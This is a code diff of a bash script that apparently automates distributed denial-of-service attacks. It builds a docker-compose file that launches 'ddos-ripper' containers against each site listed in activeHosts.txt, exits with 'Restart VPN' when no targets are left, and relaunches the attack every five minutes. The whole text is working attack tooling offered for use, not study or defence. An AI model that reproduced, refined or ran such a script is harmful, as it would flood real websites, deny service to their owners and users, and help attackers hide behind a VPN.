@@ -53,8 +53,10 @@ function generate_compose {
 
     echo -e "version: '3'" > docker-compose.yml
     echo -e "services:" >> docker-compose.yml
-    counter=1
+    numberOfSites=0
 
+  for (( c=1; c<="$amount"; c++ )); do
+    counter=$c
     while read -r site_url; do
         if [ $counter -le $amount ]; then
             if [ ! -z $site_url ]; then
@@ -64,22 +66,31 @@ function generate_compose {
                 echo -e "    command: $site_url" >> docker-compose.yml
                 echo -e "    network_mode: bridge" >> docker-compose.yml
                 ((counter++))
+                ((c++))
+                ((numberOfSites++))
             fi
         fi
-    done < resources.txt
+    done < activeHosts.txt
+  done
+
+  if [ "$numberOfSites" == 0 ]; then
+    echo -e "Restart VPN"
+    exit 1
+  fi
 }
 
 function updateDepend {
     git pull origin master
     docker pull nitupkcuf/ddos-ripper
+
+    python3 script.py
 }
 
 function reinstall {
-  ripper_stop
-  check_vpn_status
-
   updateDepend
+  ripper_stop
 
+  check_vpn_status
   generate_compose
   ripper_start
 }
@@ -88,14 +99,16 @@ function ripper_start {
   echo "Starting ripper attack"
   docker-compose up -d
 
-  sleep 1800
+  sleep 300
 
-  reinstall
+  bash ddos-unix.sh -m reinstall -n $amount
 }
 
 function ripper_stop {
   echo "Stopping ripper attack"
-  docker-compose down --remove-orphans
+
+  docker-compose down
+  docker-compose rm -f
 }
 
 while test -n "$1"; do
